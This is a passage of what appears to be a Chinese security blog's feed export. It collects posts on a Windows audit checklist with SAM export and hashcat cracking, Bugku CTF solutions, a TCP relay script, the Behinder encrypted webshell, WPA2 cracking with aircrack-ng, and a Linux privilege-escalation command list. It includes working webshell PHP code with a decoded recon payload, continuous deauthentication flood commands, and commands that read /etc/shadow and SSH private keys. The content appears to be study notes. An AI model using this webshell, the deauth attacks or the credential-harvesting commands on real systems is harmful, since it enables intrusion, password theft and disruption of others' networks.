HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v EnableFirewall |find &quot;EnableFirewall&quot; 远程桌面(0开，1关) reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections |find &quot;fDenyTSConnections&quot; 3389端口(d3d:3389) reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber |find &quot;PortNumber&quot; 远程协助(0关（合规），1开 reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Remote Assistance&quot; /v fAllowToGetHelp |find &quot;fAllowToGetHelp&quot; 应用日志文件大小（0x2800000以上为合规） reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application&quot; /v MaxSize |find &quot;MaxSize&quot; 达到事件日志最大大小时（不存在或0均合规） reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application&quot; /v Retention |find &quot;Retention&quot; 安全日志文件大小（0x2800000以上为合规） reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Security&quot; /v MaxSize |find &quot;MaxSize&quot; 达到事件日志最大大小时（不存在或0均合规） reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Security&quot; /v Retention |find &quot;Retention&quot; 系统日志文件大小（0x2800000以上为合规） reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\System&quot; /v MaxSize |find &quot;MaxSize&quot; 达到事件日志最大大小时（不存在或0均合规） reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\System&quot; /v Retention |find &quot;Retention&quot; 分区共享（存在且为0，为合规） reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&quot; /v AutoShareServer |find &quot;AutoShareServer&quot; ADMIN共享（存在且为0，为合规） reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&quot; /v AutoShareWks |find &quot;AutoShareWks&quot; IPC共享（存在且为1，为合规） reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v restrictanonymous |find &quot;restrictanonymous&quot; 共享列表 reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\lanmanserver\shares&quot; 软件列表 reg query HKLM\SOFTWARE 共享信息默认共享 net share 其他信息系统服务 net start 系统进程 tasklist 系统信息 systeminfo 口令检测导出SAM reg save hklm\sam %IPaddress%.sam reg save hklm\system %IPaddress%.system 更新日志检测在更新日志中查看最后更新日期 C:\Windows\WindowsUpdate.log 分析脚本编写Windows密码破解CMD5 https://www.cmd5.com/ Ophcrack https://www.objectif-securite.ch/ophcrack.php hashcat hashcat64.exe -m 1000 -a 0 Winhash.txt pass.txt hashcat64.exe -m 1000 -a 0 Winhash.txt pass.txt --show 反病毒测试https://www.virustotal.com http://r.virscan.org/ https://s.threatbook.cn/]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[入门CTF]]></title>
    <url>%2F2018%2F12%2F18%2F%E5%85%A5%E9%97%A8CTF%2F</url>
    <content type="text"><![CDATA[头次尝试CTF20多题，有些脑洞和方法不会的，在这里记录一下，相信会越来越好。 网站是： https://ctf.bugku.com 域名解析听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag 方法： 直接在 c:\windows\system32\drivers\etc\hosts打开进行修改，在最后添加上我们需要的 然后游览器访问flag.baidu.com即可拿到flag 变量一源码： flag In the variable ! &lt;?php error_reporting(0); include &quot;flag1.php&quot;; highlight_file(__file__); if(isset($_GET[&apos;args&apos;])){ $args = $_GET[&apos;args&apos;]; if(!preg_match(&quot;/^\w+$/&quot;,$args)){ die(&quot;args error!&quot;); } eval(&quot;var_dump($$args);&quot;); } ?&gt; 从代码可以看出，这应该是个eval处存在代码注入，$$args可能存在变量覆盖，但是没有想出来如何解决，上网查之。 PHP超全局变量：$GLOBALS—-引用全局作用域中可用的全部变量。用于在 PHP 脚本中的任意位置访问全局变量 PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。 构造URL：http://123.206.87.240:8004/index1.php?args=GLOBALS 打印出全部的全局变量，找到flag WEB5JSPFUCK??????答案格式CTF{**} F12看到里面的div标签下有一大串非常长的东西。 把那一大长串放到google的console中，运行出结果得到flag。（别忘了大写） 网站被黑先入为主了，没往实战上想，实在惭愧，脑子转不过来= -。看了一下网上的解答，恍然大悟 先扫后台，扫出了shell.php 然后burp抓包爆破得到flag flag{hack_bug_ku035} flag在index里查源码，无果，抓包，无果。 构造http://123.206.87.240:8005/post/index.php?file=index.php无果。 知道这里应该有关文件包含，但是苦于无法利用。 上网查询得file传值为：php://filter/read=convert.base64-encode/resource=index.php 然后base64解密得到的值就可以得到flag php://filter协议有一下几个应用： 1、利用base64获得源码 2、通过读写编码实行绕过操作]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[rtcp.py]]></title>
    <url>%2F2018%2F12%2F17%2Frtcp-py%2F</url>
    <content type="text"><![CDATA[import socket import sys import threading import time streams = [None, None] # 存放需要进行数据转发的两个数据流（都是 SocketObj 对象） debug = 1 # 调试状态 0 or 1 def _usage(): print(&apos;Usage: ./rtcp.py stream1 stream2\nstream: l:port or c:host:port&apos;) def _get_another_stream(num): &quot;&quot;&quot; 从streams获取另外一个流对象，如果当前为空，则等待 &quot;&quot;&quot; if num == 0: num = 1 elif num == 1: num = 0 else: raise NameError(&apos;error&apos;) while True: if streams[num] == &apos;quit&apos;: print(&apos;can not connect to the target, quit now!&apos;) sys.exit(1) if streams[num] is not None: return streams[num] else: time.sleep(1) def _xstream(num, s1, s2): &quot;&quot;&quot; 交换两个流的数据 num为当前流编号,主要用于调试目的，区分两个回路状态用。 &quot;&quot;&quot; try: while True: # 注意，recv 函数会阻塞，直到对端完全关闭（close 后还需要一定时间才能关闭，最快关闭方法是 shutdow） buff = s1.recv(1024) if debug &gt; 0: print(&apos;%d recv&apos; % num) if len(buff) == 0: # 对端关闭连接，读不到数据 print(&apos;%d one closed&apos; % num) break s2.sendall(buff) if debug &gt; 0: print(&apos;%d sendall&apos; % num) except: print(&apos;%d one connect closed.&apos; % num) try: s1.shutdown(socket.SHUT_RDWR) s1.close() except: pass try: s2.shutdown(socket.SHUT_RDWR) s2.close() except: pass streams[0] = None streams[1] = None print(&apos;%d CLOSED&apos; % num) def _server(port, num): &quot;&quot;&quot; 处理服务情况，num 为流编号（第 0 号还是第 1 号） &quot;&quot;&quot; srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM) srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # 绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。 srv.bind((&apos;0.0.0.0&apos;, port)) # 开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。 srv.listen(1) while True: # 被动接受TCP客户端连接,(阻塞式)等待连接的到来 conn, addr = srv.accept() print(&apos;connected from: %s&apos; % str(addr)) streams[num] = conn # 放入本端流对象 # 获取另一端流对象 s2 = _get_another_stream(num) _xstream(num, conn, s2) def _connect(host, port, num): &quot;&quot;&quot;处理连接，num 为流编号（第 0 号还是第 1 号） @note: 如果连接不到远程，会 sleep 36s，最多尝试 200（即两小时） &quot;&quot;&quot; not_connet_time = 0 wait_time = 36 try_cnt = 199 while True: if not_connet_time &gt; try_cnt: streams[num] = &apos;quit&apos; print(&apos;not connected&apos;) return None conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: conn.connect((host, port)) except Exception: print(&apos;can not connect %s:%s!&apos; % (host, port)) not_connet_time += 1 time.sleep(wait_time) continue print(&apos;connected to %s:%i&apos; % (host, port)) streams[num] = conn # 放入本端流对象 s2 = _get_another_stream(num) # 获取另一端流对象 _xstream(num, conn, s2) def main(): # if len(sys.argv) != 3: # _usage() # sys.exit(1) tlist = [] # 线程列表，最终存放两个线程对象 # targv = [sys.argv[1], sys.argv[2]] targv = [&quot;l:4567&quot;, &quot;c:127.0.0.1:80&quot;] for i in [0, 1]: s = targv[i] # stream 描述 c:ip:port 或 l:port sl = s.split(&apos;:&apos;) if len(sl) == 2 and (sl[0] == &apos;l&apos; or sl[0] == &apos;L&apos;): # l:port t = threading.Thread(target=_server, args=(int(sl[1]), i)) tlist.append(t) elif len(sl) == 3 and (sl[0] == &apos;c&apos; or sl[0] == &apos;C&apos;): # c:host:port t = threading.Thread(target=_connect, args=(sl[1], int(sl[2]), i)) tlist.append(t) else: _usage() sys.exit(1) for t in tlist: t.start() for t in tlist: t.join() sys.exit(0) if __name__ == &apos;__main__&apos;: main()]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[动态二进制加密实现一句话木马（冰蝎）]]></title>
    <url>%2F2018%2F12%2F17%2F%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E5%AE%9E%E7%8E%B0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%88%E5%86%B0%E8%9D%8E%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言一句话木马从最早的&lt;?php @eval($_POST[cmd]);?&gt;到现在，也有很长时间的历史了。客户端工具也从最简单的一个html页面发展到现在的各种GUI工具。但是近些年友军也没闲着，涌现出了各种防护系统，这些防护系统主要分为两类：一类是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测；另一类是基于网络流量的，如各种云WAF、各种商业级硬件WAF、网络防火墙、Net Based IDS等，基于网络的防护设备其检测原理是对传输的流量数据进行特征检测，目前绝大多数商业级的防护设备皆属于此种类型。一旦目标网络部署了基于网络的防护设备，我们常用的一句话木马客户端在向服务器发送Payload时就会被拦截，这也就导致了有些场景下会出现一句话虽然已经成功上传，但是却无法连接的情况。 为什么被拦截虽然有时候会采用base64编码，但是payload任有特征字符如eval等，参数值有base64编码等等。对方的规则也在不断的更新，不断识别关键的编码函数名称、加解密函数名称，并加入到规则里面。于是攻击者和防御者展开了长期的较量，不停的变换着各种姿势。 为啥防御者可以不停的更新规则主要有两个原因： 攻击者发送的请求都是脚本源代码，无论怎么样编码，仍然是服务器端解析引擎可以解析的源代码，是基于文本的，防御者能看懂。 攻击者执行多次相同的操作，发送的请求数据也是相同的，防御者就可以把他看懂的请求找出特征固化为规则。 但是如果攻击者的请求不是文本格式的源代码而是编译之后的的字节码，字节码是一堆二进制数据流，不存在参数，攻击者把二进制字节码进行加密，防御者看到的就是一堆加了密的二进制数据流，攻击者多次执行同样的操作采用不同的密钥加密，即使是同样的payload，防御者看到的请求数据也不一样，这就使防御者无法通过流量分析来提取规则。 一劳永逸的绕过具体流程： 首次连接一句话服务端时，客户端首先向服务器端发起一个GET请求，服务器端随机产生一个128位的密钥，把密钥回显给客户端，同时把密钥写进服务器的Session中。 客户端获取密钥后，对本地的二进制payload先进行AES加密，再通过POST方式发送至服务器端。 服务器收到数据后，从Session中取出秘钥，进行AES解密，解密之后得到二进制payload数据。 服务器解析二进制payload文件，执行任意代码，并将执行结果加密返回。 客户端解密服务器端返回的结果。 执行流程图： 服务端实现PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。 代码： &lt;?php session_start(); if (isset($_GET[&apos;pass&apos;])) { #uniqid()基于以微秒计的当前时间，生成一个唯一的 ID。 $key=substr(md5(uniqid(rand())),16); $_SESSION[&apos;k&apos;]=$key; print $key; } else { $key=$_SESSION[&apos;k&apos;]; #参数为解密密文、解密方法、解密密钥 #php://input 去获取请求体中的信息（请求类型为multipart/form-data 时 失效不会封装 数据为空）封装起来返回给程序 无法获取get信息 因为GET的信息附加到URL里 不在请求体中 $decrptContent=openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $key); $arr=explode(&apos;|&apos;,$decrptContent); $func=$arr[0]; $params=$arr[1]; $func($params); } ?&gt; 流程： 首先客户端以Get形式发起带密码的握手请求，服务端产生随机密钥并写入Session。 客户端将源代码，如assert|eval(&quot;phpinfo();”)利用AES加密，发送至服务端，服务端收到之后先进行AES解密，得到中间结果字符串assert|eval(&quot;phpinfo();&quot;)。 服务端利用explode函数将拆分为一个字符串数据，索引为0的元素为字符串assert，索引为1的元素为字符串eval(&quot;phpinfo();&quot;)。 以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为assert(&quot;eval(\&quot;phpinfo;\&quot;)&quot;) 。 再具体一点，比如客户端有一段代码 assert|eval(&quot;phpinfo();&quot;) 进行AES128加密发送给服务端，服务端用explode函数分割字符，索引为0的是assert，索引为1的eval(&quot;phpinfo();&quot;)，然后通过可变函数执行assert(&quot;eval(\&quot;phpinfo();\&quot;)&quot;)。 客户端实现通过作者提供的客户端，拿到： assert|eval(base64_decode(&apos;ZXJyb3JfcmVwb3J0aW5nKDApOw0KZnVuY3Rpb24gbWFpbigpIHsNCiAgICBvYl9zdGFydCgpOyBwaHBpbmZvKCk7ICRpbmZvID0gb2JfZ2V0X2NvbnRlbnRzKCk7IG9iX2VuZF9jbGVhbigpOw0KICAgICRkcml2ZUxpc3QgPSIiOw0KICAgIGlmIChzdHJpc3RyKFBIUF9PUywid2luZG93cyIpfHxzdHJpc3RyKFBIUF9PUywid2lubnQiKSkNCiAgICB7DQogICAgICAgIGZvcigkaT02NTskaTw9OTA7JGkrKykNCiAgICAJew0KICAgIAkJJGRyaXZlPWNocigkaSkuJzovJzsNCiAgICAJCWZpbGVfZXhpc3RzKCRkcml2ZSkgPyAkZHJpdmVMaXN0PSRkcml2ZUxpc3QuJGRyaXZlLiI7IjonJzsNCiAgICAJfQ0KICAgIH0NCgllbHNlDQoJew0KCQkkZHJpdmVMaXN0PSIvIjsNCgl9DQogICAgJGN1cnJlbnRQYXRoPWdldGN3ZCgpOw0KICAgIC8vZWNobyAicGhwaW5mbz0iLiRpbmZvLiJcbiIuImN1cnJlbnRQYXRoPSIuJGN1cnJlbnRQYXRoLiJcbiIuImRyaXZlTGlzdD0iLiRkcml2ZUxpc3Q7DQogICAgJG9zSW5mbz1QSFBfT1M7DQogICAgJHJlc3VsdD1hcnJheSgiYmFzaWNJbmZvIj0+YmFzZTY0X2VuY29kZSgkaW5mbyksImRyaXZlTGlzdCI9PmJhc2U2NF9lbmNvZGUoJGRyaXZlTGlzdCksImN1cnJlbnRQYXRoIj0+YmFzZTY0X2VuY29kZSgkY3VycmVudFBhdGgpLCJvc0luZm8iPT5iYXNlNjRfZW5jb2RlKCRvc0luZm8pKTsNCiAgICAvL2VjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCk7DQogICAgc2Vzc2lvbl9zdGFydCgpOw0KICAgICRrZXk9JF9TRVNTSU9OWydrJ107DQogICAgLy9lY2hvIGpzb25fZW5jb2RlKCRyZXN1bHQpOw0KICAgIGVjaG8gb3BlbnNzbF9lbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAiQUVTMTI4IiwgJGtleSk7DQp9DQptYWluKCk7&apos;)); 经过base64解码得： error_reporting(0); function main() { ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) { for($i=65;$i&lt;=90;$i++) { $drive=chr($i).&apos;:/&apos;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;; } } else { $driveList=&quot;/&quot;; } $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&apos;k&apos;]; //echo json_encode($result); echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); } main(); 可以看出这段代码主要做了这些工作： 保存phpinfo内容 ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); ob_start()把输出内容输出到缓冲区而不是游览器，然后用ob_get_contents得到缓冲区数据，最后用ob_end_clean清除缓冲区 服务端有哪些盘符 $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) { for($i=65;$i&lt;=90;$i++) { $drive=chr($i).&apos;:/&apos;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;; } } else { $driveList=&quot;/&quot;; } 获取当前路径 $currentPath=getcwd(); 以及检查php运行环境。 $osInfo=PHP_OS; 然后对这些信息进行base64编码，再用json编码，再用key进行”AES128”加密。 $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&apos;k&apos;]; //echo json_encode($result); echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); 借鉴自：http://halazi.xin/2018/12/11/Behinder/ https://xz.aliyun.com/t/2744]]></content>
      <categories>
        <category>加密解密</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux账户安全机制]]></title>
    <url>%2F2018%2F12%2F13%2FLinux%E8%B4%A6%E6%88%B7%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[Linux系统标识与鉴别-安全主体安全主体 用户：身份标识（UserID） 组：身份标识（Group ID） 用户与组基本概念 文件必须有所有者 用户必须属于某个或多个组 用户与组的关系灵活（一对多、多对多等都可以） 根用户拥有所有权限 Linux系统标识与鉴别-帐号信息存储信息存储用户信息/etc/passwd /etc/shadow 组信息/etc/group /etc/gshadow 在Linux中系统中，并不认识帐号名称，认识的是帐号ID，帐号ID保存在/etc/passwd文件中 在登录Linux主机时，在输入完帐号和密码时，Linux会先查找/etc/passwd文件中是否有这个帐号，如果没有则跳出，如果有的话，他会读取该帐号的user ID和group ID同时该帐号的根目录和shell也读了出来 /etc/passwd中的信息 一共有七项，每一项使用：分开，他们代表的意思如下： （1）帐号名称：帐号名称由于对应用户ID，这个是系统默认用户root超级管理员，在同一个系统帐号名称是唯一的。 （2）密码：由于系统中/etc/shadow文件用于存放加密后的口令，所以在这里这一项是“x”来表示，如果用户没有设置口令，则该项为空。 （3）用户lD：不同的用户识别码不同，其中用户ID有以下几种：0代表系统管理员（如果建立一个系统管理员，可以建立一个普通帐户，然后将该账户的用户1D改为0即可）。1-500系统预留的1D，500以上是普通用户使用。 （4）组ID：用来规范群组，他与/etc/group有关。 （5）描述信息：这个字段几乎没有什么作用，只是用来解释这个帐号的意义。 （6）用户根目录：就是用户登录系统的起始目录，用户登录系统后将首先进入该目录。root用户默认的是/root，普通用户的是/home/用户名。 （7）用户登录shell：就是用户登录系统时使用的shell。 /etc/shadow中的信息 由于passwd文件对于系统中的所有用户是可读的，口令比较容易破解，存在较大的安全隐患。 使用“shadow”文件保存密文的用户口令，“shadow”文件只有管理员用户才可以读取其中的内容。 登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：不活动时间：失效时间：标志 （1）帐户名称：和passwd对应，和passwd的意思相同。 （2）密码：已经加密过的真正的密码，只能看到一些特殊符号。如第一个字符为“*”表示此用户不用来登录，如不想让某账户登录可在前面加个星。 $1$表明是用MD5加密的 $2$是用Blowfish加密的 $5$是用SHA-256加密的 $6$开头的，表明是用SHA-512加密的， （3）上次改动密码的日期：这段记录了改动密码的最后日期。因为Linux计算日期的方法是以1970年1月1日作为1，1971年1月1日就是366，依次类推 （4）密码不可被改动的天数：必须在这个时间内重新修改密码，否则这个帐号将暂时失效。上面的99999，表示密码不需要重新输入 （5）密码变更期期限快到前的警告期：当帐号的密码失效期限快到时，系统依据这个字段的设定发出警告，提醒用户：再过n天您的密码将过期，请尽快重新设定密码。默认的是七天。 （6）帐号失效期 （7）帐号取消日期 （8）保留：最后一个字段是保留的，看以后有没有新功能加入。 /etc/group中的信息 （1）群组名称：就是群组的名称了。 （2）群组密码：通常不需设定，很少使用群组登录。密码被记录在/etc/gshadow中。 （3）群组ID：也就是组ID了。 （4）支持帐号的名称：这个群组的所有帐号]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[利用airodump-ng和aircrack-ng进行无线破解]]></title>
    <url>%2F2018%2F12%2F12%2F%E5%88%A9%E7%94%A8airodump-ng%E5%92%8Caircrack-ng%E8%BF%9B%E8%A1%8C%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[WEP（有线等效保密）认证过程： 客户端向接入点发送认证请求 接入点发回一段明文 客户端利用事先共享的密钥加密这段明文（对称），并再次发出认证请求 接入点对数据包进行解密，比较明文，来决定是否接受请求 WEP2（wifi网络安全接入）安全性： WPA2在密钥足够强的情况下是安全的，过短的密钥仍可能被爆破解出 WPA2-PSK指的是WPA2个人版，指的是使用事先约定的密钥进行认证的WPA2 Aircrack-ng抓包及破解WPA2 虚拟机安装无线网卡 配置无线网卡 利用airodump-ng进行抓包 利用crunch生成字典 利用aircrack-ng进行爆破 Aircrack是破解WEP/WPA/WPA2加密的主流工具之一。Aircrack-ng套件包含的工具可用于捕获数据包、握手验证。可用来进行暴力破解和字典攻击。 Aircrack-ng 攻击 主要是拿到握手包，用字典破解握手包。 首先，你得有个无线网卡，然后去自动配置他，操作嘛当然都是在kali虚拟机下进行的。 准备阶段airmon-ng check kill kill掉影响网卡的进程，一般情况下，每次重启或者开机后这些进程都会自己开始。 将无线网卡模式改为monitor模式 iwconfig wlan0mon mode monitor 打开网卡： airmon-ng start wlan0 这时候网卡名为wlan0mon。（mon是monitor的缩写，意思为监控） wifi嗅探查看当前区域的所有wifi airodump-ng wlan0mon BSSID：wifi路由的 Mac地址， Data 当前wifi数据大小，有数据就表明有人正在使用，你就可以把它作为一个选择了。 CH ：渠道，后面的攻击要用到。 ESSID： wifi的 名字。还有，他的排序是按信号的强弱来排序的，越往上信号越强。PWR 是强度，不用记，慢慢的就知道了。 经过观察之后选择一个你想破解或者攻击的wifi，前提是它得有数据显示，Date的那列，所以选择攻击的wifi最好先从Date看起来，选择一个有数据的wifi之后按Ctrl+c 停止检测，复制你选择的Mac地址。 下一步airodump-ng --bssid 0C:4B:54:AE:C1:06 -c 11 -w ~/wlan0/qihua wlan0mon -c 是 渠道 bssid 是路由的Mac地址 -w是放包的目录 可以看到有三个连接。 洪水攻击（重复不断的攻击）aireplay-ng -0 0 -a 0C:4B:54:AE:C1:06 -c CC:2F:71:8C:FA:4B wlan0mon -0表示一直不断的攻击，类似于拒绝服务攻击，占满你的握手请求通道，其他的连接进不来，也可以让当前所有连接断开，-c在这里表示的是client的mac地址。 攻击的时候不要关闭抓包窗口，注意观察抓包窗口。 过一会停掉洪水攻击，静等别人连接，出现WPA handshake : ，就表示成功。如果有连接很快就可以抓到包 抓包信息及爆破 抓到握手包那么就可以用密码字典进行爆破了，爆破的是.cap文件。 aircrack-ng -w password.txt wlan0/qihua-01.cap 接下来就静静等待跑包。 完成！密码51201314]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[GeoIP]]></title>
    <url>%2F2018%2F12%2F11%2FGeoIP%2F</url>
    <content type="text"><![CDATA[import pygeoip gi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;) def printRecord(tgt): rec = gi.record_by_name(tgt) print(rec) city = rec[&apos;city&apos;] # region = rec[&apos;region_name&apos;] country = rec[&apos;country_name&apos;] long = rec[&apos;longitude&apos;] lat = rec[&apos;latitude&apos;] print(&apos;[*] Target: &apos; + tgt + &apos; Geo-located. &apos;) print(&apos;[+] &apos; + str(city) + &apos;, &apos; + str(country)) print(&apos;[+] Latitude: &apos;+str(lat) + &apos;, Longitude: &apos; + str(long)) tgt = &apos;114.242.146.98&apos; printRecord(tgt) GeoLiteCity.dat在网上可以免费下载。]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux提权常用命令]]></title>
    <url>%2F2018%2F12%2F07%2FLinux%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[操作系统相关操作系统类型版本cat /etc/issue cat /etc/*-release cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhat 内核版本(主要看是否为64位)cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz- 环境变量cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set 查看是否有打印机lpstat -a 应用与服务相关查看正在运行的程序及对应的用户权限ps aux ps -ef top cat /etc/services 查看以root权限正在运行的程序ps aux | grep root ps -ef | grep root 查看安装了的应用ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archives ls -alh /var/cache/yum/ 一些服务的配置文件cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos; 计划任务crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root 找存储的明文用户名，密码grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla 通信与网络相关查看当前网络地址/sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network 查看网络配置，DNS，DHCP，网关cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname 查看网络通信lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w 查看缓存arp -e route /sbin/route -nee tcpdump(网络上的数据包进行截获的包分析工具)tcpdump 默认启动 tcpdump -i eth1 监视指定网络接口的数据包 tcpdump host 210.27.48.1 接货所有210.27.48.1的主机收到和发出的数据包 具体用法：https://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html 用户相关id who w last cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos; # 列出超级用户 awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd #列出超级用户 cat /etc/sudoers sudo -l 列家目录ls -ahlR /root/ ls -ahlR /home/ 从配置文件里面寻找密码cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 看其他用户的操作记录cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history ssh私钥cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key 文件系统相关日志文件ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases 查看网站文件ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/ 常见日志文件cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat 